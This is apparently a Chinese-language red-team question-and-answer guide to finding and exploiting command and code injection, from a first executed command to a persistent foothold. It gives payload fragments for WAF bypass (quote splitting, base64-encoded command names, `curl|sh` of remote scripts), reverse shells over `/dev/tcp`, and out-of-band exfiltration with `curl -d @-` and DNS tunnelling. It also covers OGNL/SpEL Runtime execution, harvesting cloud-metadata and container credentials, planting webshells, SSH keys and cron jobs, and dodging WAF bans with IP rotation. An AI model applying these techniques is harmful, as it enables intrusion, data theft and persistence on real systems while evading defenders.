**A5**: 一旦确认某存储点会被执行,固化触发路径:明确"存什么内容→谁在何时执行→执行身份是什么"。若执行方是高权限定时任务/管理进程,这个点价值极高,值得从"能触发"打磨成"可控稳定触发+落地 shell",并记录完整链路供权限提升复用。

### 从注入到稳定 shell 的落地
**Q1**: 命令注入已确认能执行单条命令,怎么从"能跑一条命令"升级到"稳定交互 shell"?
**A1**: 分级推进。先确认出网方向(目标能否连出、哪些端口/协议放行),据此选反弹方式:bash/nc/python 反弹、或经 HTTP/DNS 隧道。不能直接反弹则先落 webshell(写文件到 web 目录)或用带外逐步交互。定位阶段先摸清"能出网到哪"再定 shell 形态。
**Q2**: 反弹 shell 连不回来,怎么定位是哪一环的问题?
**A2**: 拆环验证:先 `;curl <你的IP>:<端口>` 确认目标能否主动连你(测出网+端口);能连出说明网络通,是反弹命令语法/被拦问题;连不出说明出网被限,要换端口(试 80/443/53)或换协议。用最简单的带外连通性测试隔离故障环节。
**Q3**: 完全不出网(纯内网隔离),怎么落地可交互能力?
**A3**: 转半交互:命令输出重定向到 web 可读文件实现"发命令+读文件"的伪交互,或经已有的 HTTP 通道做 tunneling(把注入点包装成一个命令执行 API,自己写客户端轮询)。无出网时,基于目标已开放的入站服务构建交互,而非依赖反弹。
**Q4**: shell 落下但极不稳定(命令超时/进程被杀),怎么办?
**A4**: 定位不稳定根因:是执行有超时(后端设了 timeout,长命令被截)→改用后台 nohup/setsid 脱离;是 WAF/EDR 杀反弹进程→换更隐蔽落地(内存马、合法进程注入);是无 tty→用 python pty 升级。对症而非反复重连。
**Q5**: 所有落 shell 手段都失败,但命令注入确实可用,还有价值吗?
**A5**: 有。降级为"盲命令执行"仍可达成目标:带外外带敏感文件、读取凭据/配置、横向探测内网、在目标上写公钥/植入计划任务。转变思路——不一定要交互 shell,一次性命令执行 + 带外外带,足以完成大量红队目标。把"拿不到 shell"重新定义为"用受限执行完成任务"。

### 关键字过滤:命令等价替换的定位
**Q1**: 分隔符能用,但具体命令关键字(如读文件的命令)被 WAF 拦,怎么定位可用的等价写法?
**A1**: 一个功能有多种命令实现,逐个换:读文件不止一个命令,可用 `tac`/`nl`/`head`/`tail`/`more`/`sort`/`grep .`/`awk`/`sed`/`xxd`/`od`/`base64`/`while read` 循环,甚至 `mapfile`。WAF 黑名单常只覆盖最常见几个,换冷门等价命令即绕。
**Q2**: 命令名本身也被逐字符匹配怎么办?
**A2**: 用 shell 的字符串打断技巧:引号插入 `c""at`/`c'a't`、反斜杠 `c\at`、变量拼接 `a=at;c$a file`、通配符 `/bin/c?t`、`/bin/ca[t]`。这些在 shell 执行时还原为原命令,但字面上打断了 WAF 的关键字匹配。定位是找"字面不同、执行相同"的写法。
**Q3**: 连通配符和引号打断都被过滤,转哪?
**A3**: 转"编码还原"层:`$(printf '\x63\x61\x74')`、`$(echo Y2F0|base64 -d)`,把命令名藏进编码,运行时才解码执行。WAF 看到的是编码字符串,shell 执行时才变成命令。绕过重心从"变形命令名"转到"运行时解码"。
**Q4**: 所有命令层绕过都失败,这条路断了,转正交维度?
**A4**: 转"外置脚本"策略:不在注入点写任何敏感命令,只让目标 `curl|sh` 拉取你远端脚本,敏感命令全在你服务器的脚本里,WAF 在注入点看不到它们。若连 curl/wget 都被拦,用 `/dev/tcp` bash 内建、或 python/perl 一行下载执行替代。
**Q5**: 为什么"换命令"应该在"换写法"之前先试?
**A5**: 换等价命令(tac 代 cat)成本最低、最不易出错,且不依赖 shell 特性;而引号打断/编码依赖具体 shell 支持且更易触发其他规则。定位遵循"最小改动优先":先换命令,再变形写法,最后上编码/外置,逐级升级复杂度。

### 区分命令注入与反序列化 RCE
**Q1**: 我看到一个接收序列化数据的接口(Java/PHP/Python),这是命令注入还是反序列化?怎么定位?
**A1**: 看数据形态和入口。命令注入是明文参数进 shell;反序列化是接口接收对象字节流(Java `AC ED 00 05` 或 base64 `rO0`、PHP `O:数字:`、Python pickle)。识别到序列化魔术头/结构,走反序列化 gadget 链定位,而非 shell 元字符。
**Q2**: 怎么快速确认是反序列化且可能可利用?
**A2**: 发畸形/截断的序列化数据看异常栈:栈里出现 `readObject`/`unserialize`/`pickle.loads`/`ObjectInputStream` 确认反序列化在发生。再探测依赖里有无已知 gadget(库指纹),或用带 DNS 探测的 gadget(如 URLDNS 类)验证反序列化是否被执行且能出网。
**Q3**: 反序列化确认了但没有现成 gadget 链达成 RCE,怎么办?
**A3**: 分级降级:先用 DNS/探测型 gadget 证明可控(至少 SSRF/探测),再找依赖中的执行型 gadget(库版本对应的链)。无 RCE 链时,反序列化仍可能被利用为文件写、SSRF、DoS。定位重心从"直接 RCE"转到"这条链能达成什么效果"。
**Q4**: 判断错了——其实不是反序列化,数据被当明文处理,转哪?
**A4**: 转命令注入/表达式注入。若序列化数据里某字段最终被拼进命令或模板(如对象某属性进了 `Runtime.exec`),那是"反序列化触发的命令注入"混合体。回到明文注入探针,测该字段是否直接进 shell/解释器,别被"接口收序列化数据"锁死思路。
**Q5**: 为什么容易把命令注入和反序列化混淆?
**A5**: 两者都可致 RCE 且都发生在"数据被危险消费"环节,但攻击原语完全不同(shell 语法 vs 对象图 gadget)。定位第一要务是看数据入口形态(明文参数 vs 序列化字节流),形态决定用哪套 payload 体系,选错整条路都白费。

### 长度受限下的注入定位
**Q1**: 注入点有效但字段长度限制很短(如 20 字符),放不下完整 payload,怎么办?
**A1**: 拆分与外置。短字段够放一个引导命令:`;curl x.co|sh`(拉远端脚本)或写入分段追加(多次请求把 payload `>>` 拼进一个文件再执行)。定位思路从"一次打完"转为"用短命令引导出完整能力"。
**Q2**: 短到连 curl 都放不下,怎么压缩?
**A2**: 极限压缩:用最短域名/IP、`/dev/tcp` bash 内建代替 curl、shell 变量复用、通配符缩短路径(`/???/nc`)。或分多次请求:第一次 `echo 'part1'>f`,后续 `>>f` 追加,最后 `sh f`。把长 payload 摊到多个短请求里。
**Q3**: 怎么判断长度限制是前端还是后端强制的?
**A3**: 老规矩绕前端直发超长值,看后端是否截断/报错。若后端不截断=前端 maxlength 虚设,直接放长 payload;若后端硬截断到 N 字符,才需要压缩/分段策略。先测清真实长度上限再设计 payload。
**Q4**: 后端硬截断且极短,分段和外置都不现实,转哪?
**A4**: 转别的输入源:同一逻辑可能有不放长度限制的其他入口(header、上传文件内容、JSON body 深层字段)。命令注入的危险汇聚点常被多入口喂数据,换个不限长的入口打同一个点,比在短字段里螺蛳壳做道场高效。
**Q5**: 为什么分段追加要注意执行时机?
**A5**: 分段写文件期间,若某中间态被提前执行会出错;要确保"全部片段写完"再触发 `sh f`。定位这类利用要控制好写入与执行的顺序,用单独一次请求做最终触发,避免竞态导致半截 payload 执行失败。

### 黑名单地图:逐字符探测定位过滤规则
**Q1**: 注入点被某种过滤挡住,我想系统性搞清它到底拦什么,怎么做?
**A1**: 画黑名单地图。用受控探针逐类测试:每次只发一个特殊字符/关键字(`;` `|` `&` `$` `` ` `` `(` `)` `<` `>` 空格 `sleep` `cat` `/` `.` 等),记录 通过/拦截/被转义 三态。得到精确的"允许字符集"和"禁用字符集",绕过就有的放矢。
**Q2**: 怎么区分"被拦"和"被转义/被删"?
**A2**: 三种处理结果不同:拦截=请求被拒(403/报错);转义=字符前加 `\` 或被 HTML 实体化(失去元字符作用但还在);删除=字符被静默移除(payload 变形)。发 `a;b` 观察回显是 `a;b`/`a\;b`/`ab`,即可区分。删除型有时可用双写 `;;` 绕(删一个剩一个)。
**Q3**: 发现是删除型过滤(移除关键字),怎么利用?
**A3**: 双写/嵌套绕:过滤把 `sleep` 删成空,那 `slsleepeep` 删中间 `sleep` 后剩 `sleep`。对分隔符 `;;`、命令 `sysystemtem` 同理。定位到"删除型且不递归"就用嵌套还原。若递归删除则此法失效,需换编码/等价词。
**Q4**: 黑名单地图显示过滤极严(几乎全禁),转哪?
**A4**: 转"是否有解码窗口"或"换入口"。全禁字符集下,先确认有无多层解码(编码绕);无则判定此入口防护到位,转向同后端的弱校验入口或其他漏洞类型。花时间画地图的价值之一就是快速得出"此路防护过强、及时止损"的结论。
**Q5**: 画黑名单地图会不会太慢、太吵?
**A5**: 会有请求量,但比盲目试 payload 高效且信息密度高。生产环境注意节流、避免触发封禁;可优先测最关键的几类字符(分隔符、空格、`$`、`/`)快速判断可行性,再决定是否细画。定位讲究"用最少探针拿最多规则信息"。

### 表达式注入(EL/OGNL/SpEL)的精确定位
**Q1**: Java 应用某处 `${...}` 或 `#{...}` 求值了,怎么定位是哪种表达式引擎?
**A1**: 用引擎特征探针。`${7*7}`=49 偏 JSP EL/Spring;`%{7*7}` 偏 Struts2 OGNL;`#{7*7}` 偏 JSF/SpEL。再用引擎专属对象确认:OGNL 有 `#context`/`@java.lang.Runtime@`,SpEL 有 `T(java.lang.Runtime)`,精确到引擎才能选对 RCE payload。
**Q2**: 确认是 OGNL/SpEL 后,到 RCE 的关键对象是什么?
**A2**: 都通向 `java.lang.Runtime`/`ProcessBuilder`。SpEL:`T(java.lang.Runtime).getRuntime().exec(...)`;OGNL:经 `@java.lang.Runtime@getRuntime()` 或 ProcessBuilder,常需绕 Struts 的 SecurityMemberAccess 沙箱。定位是"确认能否触达 Runtime 及沙箱限制强度"。
**Q3**: 表达式求值成功但 exec 被沙箱拦,怎么定位绕过点?
**A3**: 定位沙箱版本与已知绕过:Struts OGNL 沙箱历经多次绕过(不同 CVE 对应不同 `_memberAccess`/上下文操纵手法),SpEL 沙箱较弱通常可直达。识别框架精确版本→匹配对应沙箱绕过技术。这一步是版本敏感的定位,不能用通用 payload 硬套。
**Q4**: 数学求值都不生效,`${7*7}` 原样返回,这条表达式路断了怎么转?
**A4**: 转普通 SSTI 或其他注入:`${}` 原样返回可能是它进了别的模板引擎(试 `{{}}`/`#{}`/`<%%>`),或压根没进任何解释器(试 shell/SQL 探针)。别把所有 `${}` 都当 Java EL,横向换语法体系验证真实执行环境。
**Q5**: 为什么表达式注入定位要死抠引擎版本?
**A5**: 因为 OGNL/SpEL 的可利用性高度依赖框架版本和沙箱状态,同样 `${7*7}=49` 在不同版本可能一个直接 RCE、一个需要复杂绕过甚至打不了。定位不止于"能求值",要精确到引擎+版本+沙箱,才能判断这个点的真实利用价值和所需 payload。

### 疑似点零反馈:差异化探针确认
**Q1**: 某参数我强烈怀疑是注入点,但发什么都"看起来一样",怎么确认它到底有没有戏?
**A1**: 上差异化对照探针。构造"应触发 vs 不应触发"的成对 payload,比较响应的任何可测维度:状态码、响应长度、响应时间、返回内容细微差异、后续请求行为。哪怕肉眼看着一样,用工具 diff 逐字节比对,找出那 1bit 差异。
**Q2**: 具体怎么设计这对探针?
**A2**: 一半构造"若解析则行为不同"的输入:`sleep 0` vs `sleep 8`(时间维度)、`true` vs `false` 拼接(布尔维度)、语法正确 vs 语法错误(报错维度)、访问存在 vs 不存在资源。同一维度成对发,若两者响应有稳定可复现差异=注入存在;完全无差异=大概率无解析。
**Q3**: 有微小差异但不确定是注入还是接口本身的随机性,怎么排除?
**A3**: 多轮重复取一致性。真注入的差异是可复现的因果(每次 sleep 8 都慢 8s);随机噪声不可复现。跑 5-10 轮对照,差异稳定出现才确认。这是把"感觉可疑"变成"证据确凿"的必要一步,避免基于噪声误判。
**Q4**: 反复对照后确认完全无差异、无任何解析迹象,这条路断了怎么转?
**A4**: 果断放弃此参数,转其他攻击面。零差异且多轮确认说明输入未被危险消费,继续在此耗费是沉没成本。把它标记为"已排除",转向其他参数/入口/漏洞类型。红队的效率来自"快速证伪并转向",而非对每个可疑点无限纠缠。
**Q5**: 差异化探针这套方法除了命令注入还能用在哪?
**A5**: 通用。SQL 盲注、SSTI、XXE 盲测、访问控制、条件竞争都靠"成对差异化探针+可复现性验证"来定位。它是盲态下确认漏洞存在性的元方法。掌握它,面对任何"无明显回显"的疑似点都能系统性地证实或证伪,而不是靠运气撞 payload。

### 蓝屏级混淆:排除误判为命令注入的其他注入
**Q1**: 我注入特殊字符后行为异常,但不确定是命令注入还是别的注入(SQLi/LDAP/XPath/SSRF),怎么定位真实类型?
**A1**: 用各注入类型的判别性探针分头打。命令注入:`;sleep 5`/带外 DNS;SQLi:`' or sleep(5)-- `/`'+(select...)+'`;LDAP:`*)(uid=*`;XPath:`' or '1'='1`;SSRF:让参数指向你的 collaborator 看是否服务端发起请求。同一异常参数用不同类型探针命中谁,就是谁。
**Q2**: 多个探针都有反应怎么办(比如命令和 SQL 都疑似)?
**A2**: 说明数据流经多层。可能参数先进 SQL 又把结果拼进命令,或注入点在一条调用链的不同环节都被消费。定位最可利用的那层:看哪个探针给出最直接的 RCE 迹象(命令层带外命中优先),从危害最高的那层深入。
**Q3**: 怎么避免把"接口本身报错"误当成注入信号?
**A3**: 对照基线。先发一个明显非法但无注入语义的值(如超长随机串)看接口的"普通报错"长啥样,再发注入探针,只有当注入探针产生了不同于普通报错的、符合注入语义的差异(延迟、带外、特定语法报错)才算数。建立基线是排除误判的前提。
**Q4**: 所有类型探针都无反应,是不是这参数根本不可注入,该放弃吗?
**A4**: 先转"参数是否真正到达后端逻辑"的检查:可能它被前置校验拦、被缓存挡、或压根是个无用参数。发一个能改变正常响应的合法值确认参数"活着"再下结论。若参数确实影响响应却对所有注入探针免疫,才转向其他参数/入口。
**Q5**: 为什么定位阶段要专门花力气排除类型误判?
**A5**: 因为选错注入类型会导致后续所有 payload 都南辕北辙,白白消耗大量请求和时间预算,还可能触发防护封禁。先花少量探针精确定性,再投入利用,是高效红队的基本纪律——磨刀不误砍柴工。

### HTTP header/环境变量通道的命令注入定位
**Q1**: body 参数都排除了,怀疑命令注入藏在 HTTP header 里,怎么定位?
**A1**: 逐个 header 埋带外探针。User-Agent、Referer、X-Forwarded-For、Host、Cookie、自定义 header 都可能被日志分析脚本、运维监控、WAF 自身、统计程序二次消费拼进命令。给每个 header 放唯一标识的 `;curl <id>.<collab>`,监控哪个命中。
**Q2**: 为什么 header 会进命令?典型场景是什么?
**A2**: 常见于:日志被 shell 脚本处理(logrotate 后处理、awk/grep 分析 UA)、XFF 进封禁脚本调 iptables、Referer 进统计程序、Host 进配置生成。这些"运维侧消费 HTTP 数据"的环节开发者极少做输入校验,是命令注入盲区。
**Q3**: header 探针即时无反应,可能是什么原因?
**A3**: 多半是异步/延迟消费:日志类注入常在日志被定时处理时才触发,不是请求即时执行。保持带外信标监控,等待定时任务周期(几分钟到几小时),或想办法诱发日志处理(制造大量日志触发 rotate)。这类天然是二阶,别指望同步反馈。
**Q4**: 埋了信标长期不触发,这条 header 路难验证,转哪?
**A4**: 转"环境变量/其他隐蔽通道"或回到已确认攻击面。有些注入经环境变量(如经典 Shellshock 的 `() { :;};` 进 CGI 环境变量)或经文件名/元数据触发。若这些冷门通道也无果,把 header 注入标记为待观察(留信标),转向证据更强的点,别在低概率通道上阻塞。
**Q5**: 如果最终确认是日志类二阶命令注入,利用上要注意什么?
**A5**: 注意执行身份和频率:日志处理常以特定服务账号甚至 root 定时运行,一旦触发权限可能很高,价值大。但触发不受你实时控制,要么等定时周期,要么找到手动触发入口。记录"注入位置+消费脚本+触发条件+执行身份",这条链对权限提升往往是关键跳板。

### 命令输出回显位置的定位
**Q1**: 命令注入生效了(带外证实),但我想拿到命令的实际输出,输出到底会显示在哪?怎么找回显位置?
**A1**: 系统排查可能的回显承载。输出可能出现在:直接的响应体、某个字段(如"结果""日志""状态"栏)、错误信息里、下一次请求某接口的返回、导出的文件、页面某个不起眼的隐藏区域。先注入 `id`/`whoami` 这种短输出,再在整个响应(含 header、注释、隐藏字段)里搜 `uid=`/用户名特征。
**Q2**: 响应里完全搜不到输出,但命令确实执行了,怎么办?
**A2**: 输出被丢弃(命令的 stdout 没被应用回显)。转"自建回显":把输出重定向到你能读到的地方——写进 web 目录再 GET、塞进一个你能查询的数据字段、或经带外(`;id|curl -d @- <collab>` 把输出 POST 出去 / 塞进 DNS 子域)。定位不到天然回显就制造人工回显。
**Q3**: 输出很长(如读大文件),带外或字段截断了怎么办?
**A3**: 分块外带:用 shell 切分(`split`、`head/tail` 分段、`dd` 按偏移)或每次 DNS 只带一小段并编号,自己端重组。或先落地成文件再分次读。定位阶段先测单次通道能承载多少字节(带外子域长度限制、字段长度),据此设计分块大小。
**Q4**: 回显位置找到了,但输出被 HTML 转义/编码看不清,转哪?
**A4**: 转"编码规避+原始读取"。让命令输出先 base64(`id|base64`)再回显,自己端解码,避开 HTML 转义和特殊字符丢失。若是二进制内容,统一 base64/hex 外带。回显定位不只是找位置,还要保证输出在传输链路上不被破坏。
**Q5**: 为什么值得花力气搞出真回显,而不是一直盲打?
**A5**: 有回显后,信息收集、凭据搜集、内网探测的效率提升一个数量级,盲打每一步都要猜。红队应尽早把"盲执行"升级为"带回显执行",这是从"证明有洞"到"实际利用出货"的关键跃迁,值得优先投入。

### 出网受限时带外协议的选择
**Q1**: 命令注入确认可执行,但要选带外通道,目标出网被限,怎么定位哪种协议能出去?
**A1**: 按"最可能放行"顺序探测:DNS(53,几乎总能出,内网也常有递归)最优先 → HTTP/HTTPS(80/443,常代理放行)→ ICMP(ping,有时放行)→ 其他高位端口(多被封)。逐个发带外探针,记录哪个协议的信标命中,那就是可用出口。
**Q2**: 为什么 DNS 通常最优先试?
**A2**: 因为多数内网即使严格限制出站,也要靠 DNS 解析正常工作,递归查询会一路转发到你的 authoritative NS。哪怕主机本身不能直连外网,DNS 请求也常能"借道"内部 DNS 服务器出去。这是最坚韧的带外通道,盲注外带首选。
**Q3**: DNS 能出但只能外带少量数据,HTTP 又不通,怎么高效利用?
**A3**: 用 DNS 做低带宽信道:命令输出编码进子域名逐段查询(每个 label≤63 字符、总长≤253),编号重组。控制好编码(base32/hex 避开 DNS 不允许的字符)和分块。带宽虽小但对外带凭据、命令结果足够。定位到"只有 DNS"就按 DNS 隧道思路设计。
**Q4**: 所有协议带外都不通(完全隔离内网),这条带外路彻底断,转哪?
**A4**: 转"入站/自建回显"维度。既然出不去,就利用目标已开放的入站服务:输出写到 web 可访问文件再由你 GET、写到某个你能查询的接口数据、或把注入点本身当命令执行 API 轮询。方向从"目标主动连你"翻转为"你主动读目标"。
**Q5**: 带外协议选择这套判断在别处也用得上吗?
**A5**: 用得上,凡是盲态漏洞(盲 SSRF、盲 XXE、盲 SQLi、反序列化验证)都要选带外通道,DNS 优先的逻辑通用。掌握"按放行概率排序探测出口"的方法,面对任何需要外带/回连的场景都能快速找到可用信道。

### RCE 确认后先判落脚环境
**Q1**: 命令注入拿到执行了,在深入之前我该先判断什么,以免走错方向?
**A1**: 先做落脚环境画像,决定后续策略。关键问题:是不是在容器里(`/.dockerenv`、cgroup 特征)?是不是在 WAF/负载均衡/边缘节点而非真正业务主机?是什么权限(`id`)?是什么网络位置(内网段、能通到哪)?环境判错会导致提权/横向方向全错。
**Q2**: 怎么快速判断是不是在容器里?
**A2**: 看 `/.dockerenv` 是否存在、`/proc/1/cgroup` 是否含 docker/kubepods、进程树是否只有少数进程、`hostname` 是否是容器 ID 样式、mount 情况。若在容器,方向转为"容器逃逸/找 K8s 元数据/service account token",而非按传统主机提权走。
**Q3**: 发现执行主机像是 WAF 设备或边缘代理而非业务后端,怎么办?
**A3**: 这是重要转向信号。边缘设备上你可能能读到转发配置、后端真实地址、TLS 私钥、访问日志(含其他用户凭据)。方向从"在这台提权"转为"利用边缘位置获取后端信息和流量",把边缘节点当跳板和情报源。
**Q4**: 环境判断显示权限极低、又在受限容器里,看着没前途,转哪个正交维度?
**A4**: 转"云元数据/凭据搜集"而非死磕本地提权。受限容器里最有价值的常是:云 metadata endpoint(拿临时凭据)、挂载的 secret/token、环境变量里的数据库/API 凭据、可达的内网服务。方向从"提本机权限"转为"用当前身份搜集能横向/上云的凭据"。
**Q5**: 为什么落脚环境判断要放在深入利用之前?
**A5**: 因为容器/边缘/云环境的后续打法与传统主机截然不同,先入为主按普通 Linux 主机猛提权,在容器里可能完全无效还浪费时间、触发告警。花两三条命令先摸清"我站在哪",能让后续每一步都朝对的方向走,是老手的基本反射。

### 小众语言(Ruby/Perl/Go 等)代码注入识别
**Q1**: 目标技术栈不是常见的 PHP/Java/Python/Node,像是 Ruby 或 Perl,怀疑代码注入怎么定位?
**A1**: 先靠指纹确认语言(Server header、错误页、cookie 名、框架特征如 Rails 的 `_session`、路由风格),再用该语言的危险函数探针。Ruby:`eval`、`send`/`public_send`、`Kernel#open`(`|command` 管道)、ERB 模板(`<%= %>`)、`Marshal.load`;Perl:`eval`、`open` 双参数(`open(F,"cmd|")`)、`system`/反引号、`/e` 正则。
**Q2**: Ruby 的 `open` 为什么是命令注入点?怎么探测?
**A2**: Ruby `Kernel#open`/`IO.read` 若参数以 `|` 开头会把后面当命令执行(`open("|id")`)。若用户输入进了这类 open 且能控制开头,注入 `|sleep 5` 即可。探测:让参数值以 `|command` 形式传入看是否执行。这是 Ruby 特有的、容易被漏的命令注入原语。
**Q3**: 判成 ERB/Slim/Haml 模板注入(Ruby SSTI),到 RCE 怎么走?
**A3**: Ruby SSTI 里 `<%= %>` 内可直接跑 Ruby,`<%= `id` %>`(反引号)或 `<%= system('id') %>` 即命令执行,比很多语言的 SSTI 更直接(Ruby 模板本就是嵌入代码)。定位确认 `<%= 7*7 %>` 出 49 后,RCE 距离很短,直接上 system/反引号。
**Q4**: 语言探针都不匹配,连语言都判不准,这条路卡住怎么转?
**A4**: 转"通用命令注入探针"打底。不管什么语言,底层调 shell 的命令注入用统一的 `;sleep`/带外都能测,不依赖语言识别。先用语言无关的 shell 探针确认是否存在命令层注入,再回头精确语言。别因为认不出语言就卡死,shell 层是各语言共通的下沉点。
**Q5**: 为什么要专门准备小众语言的知识而不只会主流几种?
**A5**: 真实目标技术栈五花八门,遇到 Go/Rust/Ruby/Perl/Lua/Elixir 时,主流 payload 全不适用。掌握"先指纹定语言→查该语言危险函数→上对应探针"的通用方法论,比死记某几种语言的固定 payload 更能适应实战。定位能力的核心是方法而非 payload 库。

### 注入间歇性成功的根因定位
**Q1**: 我的命令注入 payload 有时成功有时失败,同一请求反复发结果不一致,怎么定位原因?
**A1**: 别当随机放弃,间歇性通常有确定根因。首要怀疑:后端是负载均衡多实例,只有部分实例有漏洞/部分被 WAF 覆盖。判据:多发几次看成功率是否接近某个固定比例(如 1/3 成功→可能 3 台后端 1 台有洞)。若是,想办法固定路由(带 session/特定 header/cookie 粘连)到有洞实例。
**Q2**: 成功率不呈固定比例,而是越打越失败,怎么回事?
**A2**: 可能触发了 WAF 的动态封禁或速率限制:前几发成功,之后 IP/session 被限。判据:换 IP/换 session 后又恢复成功。转向节流(降低频率)、轮换出口 IP、或用更隐蔽的 payload 避免累积风险分。间歇失败是"被逐步封禁"的信号。
**Q3**: 排除了负载均衡和封禁,还是不稳定,可能是什么?
**A3**: 可能是竞态/异步:注入的命令执行依赖某个并发状态、临时文件、或异步队列,时序不对就失败。或是缓存——响应被缓存,你看到的是旧结果而非本次执行。判据:加随机 cache-buster 参数、拉长请求间隔、观察是否与并发量相关。
**Q4**: 各种根因都排查了仍无规律,这条不稳定的路难利用,转哪?
**A4**: 转"提高单次成功价值"策略——既然难稳定,就让每次成功都尽量多产出:一次成功即落 webshell/加计划任务/写公钥/外带一批凭据,建立不依赖该注入点的持久通道。把"每次都得靠这个抖动的注入点"转为"用一次成功换一个稳定立足点"。
**Q5**: 为什么间歇成功值得认真定位而非直接放弃?
**A5**: 间歇成功恰恰证明漏洞真实存在,放弃可惜;而根因(多后端/封禁/缓存/竞态)一旦定位,往往能转成稳定利用。很多人误把"不稳定"当"没洞"而错过,老手会把不稳定当成一条待解的线索去追,这是出货率的差距所在。

### WAF 触发封禁后的转向
**Q1**: 打着打着 IP 被 WAF 封了(403/连接重置/挑战页),怎么继续定位和利用?
**A1**: 先确认封禁粒度和时长:是封 IP、封 session/cookie、还是封指纹(TLS/UA)?发个正常请求测是否整体不可达还是仅注入被拦。据此选恢复方式:换 IP(代理池/云函数出口)、清 session、换客户端指纹。定位封禁维度才能对症解封。
**Q2**: 换了 IP 又很快被封,说明什么,怎么办?
**A2**: 说明封禁靠的是行为特征(高频、payload 特征)而非单纯 IP。转向降噪:大幅降低请求频率、去掉明显攻击特征的 payload、把探测请求混入正常流量节奏。封禁本质是"风险分累积到阈值",要么降低每请求风险分,要么放慢累积速度。
**Q3**: 封禁很严(换 IP 也难持续),这条正面硬打路走不通,转哪个正交维度?
**A3**: 转"减少所需请求数"——用最少请求拿最大成果。既然打不了几发就被封,就不做逐字符盲注这种海量请求的操作,改成:一发带外确认、一发落地持久化(webshell/公钥),从此脱离这个受 WAF 监控的注入点,用建立好的独立通道继续。策略从"多次交互"转为"一击建点"。
**Q4**: 已经建了 webshell 但也在同一 WAF 后,访问 webshell 也被拦怎么办?
**A4**: 换隐蔽通道:webshell 走加密/混淆流量、藏在正常参数里、或干脆用反弹/正向连接绕开 web 通道(经非 HTTP 端口)。转向"不经过 WAF 检测面"的通信,而非在 WAF 眼皮底下反复触发。持久化的价值就是能换一条 WAF 看不到的路。
**Q5**: 从一开始就该怎么做以减少被封风险?
**A5**: 预判优先。上手先低频侦察、先带外确认(单发即得)、确认后立即建独立立足点,把高风险的批量操作(盲注枚举、目录爆破)留到有了稳定通道再从内部做。定位阶段就带着"节约请求预算、尽早脱离监控通道"的意识,能大幅降低触发封禁的概率。

### 黑盒起步:注入点定位的优先级与预算分配
**Q1**: 面对一个大应用、时间有限,我该怎么分配精力去定位命令/代码注入,而不是无头苍蝇乱撞?
**A1**: 按"命中概率 × 危害 ÷ 成本"排序。先低成本高概率:高危功能(ping/转换/导出等)+ 明显参数,用带外探针快速扫一遍。再中成本:次要输入通道(header/文件名)、需要认证的功能。最后高成本:逐字符黑名单地图、二阶盲测。用少量高价值探测先覆盖大面,而非在一个点深挖到底。
**Q2**: 怎么避免在一个疑似点上耗太久?
**A2**: 设时间盒。给每个疑似点定一个探测预算(如 N 次请求 / M 分钟),到点若无正向信号就标记"待回访"并转下一个。红队最大的浪费是执念单点。用广度优先扫出所有"有信号"的点,再对信号最强的深入,比深度优先撞死一个高效。
**Q3**: 同时有好几个疑似注入点,先深入哪个?
**A3**: 选"信号最确定 + 到 RCE 最短 + 权限/位置最好"的。带外已命中的 > 仅时间延迟的 > 纯猜测的;直接 shell 上下文的 > 需复杂沙箱逃逸的;高权限进程/核心主机上的 > 边缘低权限的。把有限的深入预算投给期望产出最高的点。
**Q4**: 所有高概率点都扫完没有正向信号,大面覆盖失败,转哪?
**A4**: 转"降低前提假设"和"换攻击面类别"。第一步重查是否有没覆盖的输入源(认证后功能、多步流程中间态、WebSocket、GraphQL、文件内容)。第二步横向换类别:命令/代码注入不是唯一出货点,SSRF、反序列化、上传、逻辑漏洞、已知组件 CVE 可能更近。别在"必须找到命令注入"上钻牛角尖。
**Q5**: 这套优先级思维和具体的命令注入技巧是什么关系?
**A5**: 技巧决定"某个点能不能打通",优先级思维决定"该把技巧用在哪个点、用多久"。实战里后者往往比前者更影响成败——再强的绕过技巧,用在低价值点或该止损时不止损,都出不了活。定位的最高层能力是资源调度:在正确的点、正确的时间,投入正确的深度。
